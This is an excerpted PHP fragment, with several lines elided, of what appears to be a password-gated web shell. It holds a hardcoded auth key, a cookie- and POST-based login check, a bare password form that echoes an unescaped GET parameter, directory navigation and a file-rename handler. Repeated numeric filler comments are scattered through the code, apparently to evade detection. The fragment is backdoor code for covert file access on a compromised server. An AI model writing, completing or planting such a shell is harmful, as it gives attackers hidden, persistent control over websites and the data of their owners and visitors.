...
$auth_key = "3f67935ed7302ced5dc167fd577725bc";
...
$pass = false;
if (isset($_COOKIE['pw_name_98145'])) {
    if(($_COOKIE['pw_name_98145']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_98145'])) {
        if(($_POST['pw_name_98145']) == $auth_key) {
            setcookie("pw_name_98145", $_POST['pw_name_98145']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_98145' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1727020847419810 1727020847905674 1727020847440672 1727020847437917
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1727020847419810 1727020847905674 1727020847440672 1727020847437917
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1727020847419810 1727020847905674 1727020847440672 1727020847437917
            $name = PATH . "/" . $_GET['r'];
